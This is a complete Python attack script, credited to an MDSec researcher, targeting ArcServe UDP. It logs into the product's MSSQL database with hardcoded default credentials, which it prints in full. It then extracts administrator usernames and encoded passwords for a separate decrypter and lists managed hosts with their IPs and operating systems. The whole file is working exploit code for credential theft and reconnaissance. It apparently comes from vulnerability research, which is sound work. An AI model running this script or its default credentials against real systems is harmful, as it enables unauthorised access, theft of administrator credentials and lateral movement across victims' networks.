#!/usr/bin/env python3

# Retrieve admin creds from DB - Juan Manuel Fernandez (@TheXC3LL) - MDSec

import sys
import argparse
import base64
from impacket import version, tds


class sqlpwn():
    def __init__(self, addr, port):
        mssql = tds.MSSQL(addr, int(port))
        mssql.connect()
        print("[*] Connecting to the server")
        mssql.login("arcserveUDP", "arcserve_udp", "@rcserveP@ssw0rd", '', None, False)
        print("[*] Login with default creds")
        self.sql = mssql
    def getCreds(self):
        query = "select username,password from as_edge_connect_info;"
        self.sql.sql_query(query)
        print("[*] Extracting credentials:")
        for x in self.sql.rows:
            admin = x["username"]
            password = x["password"]
            try:
                password = base64.b64decode(password)
            except:
                try:
                    password = base64.b64decode(password + "=")
                except:
                    password = base64.b64decode(password + "==")
            password = password[0x80:]
            final = []
            for y in password:
                final.append(str(y))
            print("\t[+] User: " + admin)
            print("\t[+] Password: {" + ', '.join(final) + "}; // Paste it to the decrypter")

    def getHosts(self):
        query = "select ipaddress,rhostname,osdesc from as_edge_host;"
        self.sql.sql_query(query)
        print("[*] Finding hosts:")
        for x in self.sql.rows:
            print("\t[+] " + x["ipaddress"] + " | " + x["rhostname"] + " | " + x["osdesc"])


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "ArcServe - Retrieve credentials from DB")
    parser.add_argument('-target', action='store', help='Target Address')
    parser.add_argument('-port', action='store', help='Target Port')
    options = parser.parse_args()

    pwn = sqlpwn(options.target, options.port)
    pwn.getCreds()
    pwn.getHosts()

if __name__ == "__main__":
    print("\t\t-=[ ArcServe credential retriever (from DB) - Juan Manuel Fernandez (@TheXC3LL) - MDSec]=-\n\n")
    main()
    print("\n\n Have a nice day! ^_^")
